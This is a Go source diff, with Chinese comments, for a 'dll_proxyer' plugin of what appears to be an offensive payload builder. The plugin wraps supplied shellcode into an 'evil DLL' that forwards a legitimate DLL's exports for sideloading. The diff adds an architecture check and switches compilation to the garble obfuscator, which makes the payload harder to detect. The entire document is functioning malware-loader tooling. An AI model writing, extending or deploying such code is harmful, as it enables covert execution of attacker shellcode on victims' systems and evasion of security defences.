@@ -19,9 +19,10 @@ type DllProxyer struct {
 	dllData    []byte
 	dllName    string
 	reGenerate bool // 是否强制重新生成proxyer
+	x64        bool // 是否为x64 shellcode
 }
 
-func NewDllProxyer(shellcode []byte, dllData []byte, reGenerate bool, dllName string) *DllProxyer {
+func NewDllProxyer(shellcode []byte, dllData []byte, reGenerate bool, dllName string, x64 bool) *DllProxyer {
 	return &DllProxyer{
 		BasePlugin: BasePlugin{
 			PluginName: "dll_proxyer",
@@ -30,6 +31,7 @@ func NewDllProxyer(shellcode []byte, dllData []byte, reGenerate bool, dllName st
 		dllData:    dllData,
 		reGenerate: reGenerate,
 		dllName:    dllName,
+		x64:        x64,
 	}
 }
 
@@ -77,7 +79,6 @@ func (p *DllProxyer) defToExp(x64 bool, defPath, expPath string) error {
 func (p *DllProxyer) buildEvilDll(workDir string, x64 bool, expPath string) ([]byte, error) {
 	env := os.Environ()
 	env = append(env, "GOOS=windows")
-	env = append(env, "GO111MODULE=off")
 	env = append(env, "CGO_ENABLED=1")
 	if x64 {
 		env = append(env, "GOARCH=amd64")
@@ -86,9 +87,8 @@ func (p *DllProxyer) buildEvilDll(workDir string, x64 bool, expPath string) ([]b
 		env = append(env, "GOARCH=386")
 		env = append(env, "CC=i686-w64-mingw32-gcc")
 	}
-	outputDll := filepath.Join(workDir, "output.dll")
-	ldflags := fmt.Sprintf(`-ldflags="-extldflags=-Wl,%s"`, expPath)
-	cmd := exec.Command("go", "build", "-o", outputDll, "-buildmode=c-shared", ldflags)
+	// 初始化 mod
+	cmd := exec.Command("go", "mod", "init", "output")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	cmd.Dir = workDir
@@ -97,13 +97,29 @@ func (p *DllProxyer) buildEvilDll(workDir string, x64 bool, expPath string) ([]b
 	if err != nil {
 		return nil, err
 	}
+	// 生成dll
+	outputDll := filepath.Join(workDir, "output.dll")
+	ldflags := fmt.Sprintf("-extldflags=-Wl,%s", expPath)
+	cmd = exec.Command("garble", "build", "-o", outputDll, "-buildmode", "c-shared", "-ldflags", ldflags)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Dir = workDir
+	cmd.Env = env
+	err = cmd.Run()
+	if err != nil {
+		return nil, err
+	}
 	return ioutil.ReadFile(outputDll)
 }
 
 func (p *DllProxyer) Run() ([]byte, error) {
-	exports, x64, err := p.getExports()
+	exports, isDllX64, err := p.getExports()
 	if err != nil {
 		return nil, err
+	}
+	// 如果 dll 与 shellcode 的架构不相同则不予生成
+	if isDllX64 != p.x64 {
+		return nil, fmt.Errorf("the architecture of the dll and shellcode must be the same")
 	}
 	originDllName := "_" + p.dllName
 	defContent := p.genDefContent(exports, strings.TrimSuffix(originDllName, ".dll"))
@@ -124,12 +140,12 @@ func (p *DllProxyer) Run() ([]byte, error) {
 	}
 	// 将def文件转为exp文件
 	expPath := filepath.Join(tmpDir, "functions.exp")
-	err = p.defToExp(x64, defPath, expPath)
+	err = p.defToExp(isDllX64, defPath, expPath)
 	if err != nil {
 		return nil, err
 	}
 	// 进行转发dll编译
-	evilDllData, err := p.buildEvilDll(tmpDir, x64, expPath)
+	evilDllData, err := p.buildEvilDll(tmpDir, isDllX64, expPath)
 	if err != nil {
 		return nil, err
 	}
